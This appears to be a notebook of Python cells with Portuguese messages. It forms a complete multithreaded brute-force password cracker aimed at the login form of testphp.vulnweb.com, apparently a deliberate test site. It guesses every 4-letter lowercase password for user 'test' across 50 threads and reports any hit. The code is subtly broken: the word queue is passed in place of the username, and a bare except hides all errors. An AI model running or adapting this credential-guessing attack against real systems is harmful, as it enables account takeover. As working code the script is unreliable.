```python
from concurrent import futures
from itertools import permutations
from requests import post
from bs4 import BeautifulSoup
from queue import Queue
from time import sleep
```

```python
host = "http://testphp.vulnweb.com/userinfo.php"
user = "test"
```

```python
CONT = 0
WORKS = 50
words = Queue()
dicionario = [chr(x).lower() for x in range(65, 91)]
for x in permutations(dicionario, 4): words.put(x)
```

```python
def request(user, th=''):
    while not words.empty():
        try:
            frase = ''.join(words.get())
            print(f"TENTANDO QUEBRAR COM THREAD {th} {frase}")
            resp = post(host, data={"uname": user, "pass": frase})
            html = BeautifulSoup(resp.text)
            if html.title.text == "user info":
                print(f"ACHEI {user} {frase}")
                break            
        except:
            pass
```

```python
def main():
    with futures.ThreadPoolExecutor(max_workers=WORKS) as pool:
        threads = []
        for work in range(WORKS):
            threads.append(pool.submit(request,
                           words, f"TRABALHADOR {work}"))
        futures.wait(threads, return_when='ALL_COMPLETED')
    print("[[main]] &gt;&gt; Processo finalizado")
```

```python
main()
```
